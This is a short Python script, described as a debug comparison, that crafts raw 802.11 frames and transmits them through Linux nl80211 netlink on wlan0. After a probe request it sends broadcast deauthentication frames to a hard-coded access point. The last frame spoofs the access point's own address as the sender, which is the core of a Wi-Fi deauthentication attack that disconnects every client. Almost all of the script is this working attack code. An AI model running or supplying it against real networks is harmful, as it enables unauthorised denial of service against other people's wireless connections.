#!/usr/bin/env python3
"""Debug: compare probe vs deauth frame sending"""
import socket, struct, fcntl

NETLINK_GENERIC = 16
NLM_F_REQUEST = 1
NLM_F_ACK = 4

def get_nl80211_family_id():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    attr = struct.pack('HH', 12, 2) + b'nl80211\0'
    genlhdr = struct.pack('BBH', 3, 1, 0)
    nlhdr = struct.pack('IHHII', 16+len(genlhdr)+len(attr), 16, NLM_F_REQUEST|NLM_F_ACK, 1, 0)
    s.send(nlhdr + genlhdr + attr)
    resp = s.recv(4096)
    off = 20
    nllen = struct.unpack_from('I', resp, 0)[0]
    while off < nllen:
        alen, atype = struct.unpack_from('HH', resp, off)
        if atype == 1:
            fid = struct.unpack_from('H', resp, off+4)[0]
            s.close()
            return fid
        off += (alen+3) & ~3
    s.close()
    return None

def get_ifindex(ifname):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    result = fcntl.ioctl(sock.fileno(), 0x8933, struct.pack('256s', ifname.encode()))
    sock.close()
    return struct.unpack('i', result[16:20])[0]

def nla(atype, data):
    alen = 4 + len(data)
    padded = (alen+3) & ~3
    return struct.pack('HH', alen, atype) + data + b'\0'*(padded-alen)

iface = 'wlan0'
fid = get_nl80211_family_id()
ifidx = get_ifindex(iface)

# Get our MAC
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
info = fcntl.ioctl(sock.fileno(), 0x8927, struct.pack('256s', iface.encode()))
our_mac = info[18:24]
sock.close()

bssid = bytes.fromhex('04:67:61:D6:DC:92'.replace(':',''))
broadcast = b'\xff\xff\xff\xff\xff\xff'

print(f"fid={fid} ifidx={ifidx} our_mac={our_mac.hex(':')}")

s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
s.bind((0, 0))
s.settimeout(2)

def send_and_dump(name, frame, seq):
    attrs = nla(3, struct.pack('I', ifidx))     # NL80211_ATTR_IFINDEX
    attrs += nla(38, struct.pack('I', 2412))     # NL80211_ATTR_WIPHY_FREQ
    attrs += nla(51, frame)                       # NL80211_ATTR_FRAME
    attrs += struct.pack('HH', 4, 118)           # NL80211_ATTR_DONT_WAIT_FOR_ACK
    genlhdr = struct.pack('BBH', 59, 1, 0)       # CMD_FRAME
    payload = genlhdr + attrs
    nlhdr = struct.pack('IHHII', 16+len(payload), fid, NLM_F_REQUEST|NLM_F_ACK, seq, 0)
    msg = nlhdr + payload
    print(f"\n--- {name} ---")
    print(f"Frame ({len(frame)} bytes): {frame.hex()}")
    print(f"  FC=0x{struct.unpack_from('<H', frame, 0)[0]:04x}")
    print(f"  DA={frame[4:10].hex(':')}")
    print(f"  SA={frame[10:16].hex(':')}")
    print(f"  BSSID={frame[16:22].hex(':')}")
    s.send(msg)
    try:
        resp = s.recv(4096)
        nllen, nltype = struct.unpack_from('IH', resp, 0)
        print(f"  Response: nltype={nltype} nllen={nllen}")
        if nltype == 2:
            errno = struct.unpack_from('i', resp, 16)[0]
            print(f"  errno={errno}")
        else:
            print(f"  resp hex: {resp[:64].hex()}")
        return
    except socket.timeout:
        print("  TIMEOUT")

# Test probe (known working)
probe = struct.pack('<HH', 0x0040, 0)
probe += broadcast + our_mac + broadcast
probe += struct.pack('<H', 0)
probe += b'\x00\x00\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24'
send_and_dump("Probe SA=our", probe, 10)

# Deauth SA=our
deauth1 = struct.pack('<HH', 0x00c0, 0)
deauth1 += broadcast + our_mac + bssid
deauth1 += struct.pack('<HH', 0x10, 7)
send_and_dump("Deauth SA=our", deauth1, 20)

# Deauth SA=bssid (spoofed)
deauth2 = struct.pack('<HH', 0x00c0, 0)
deauth2 += broadcast + bssid + bssid
deauth2 += struct.pack('<HH', 0x20, 7)
send_and_dump("Deauth SA=bssid(spoof)", deauth2, 30)

s.close()
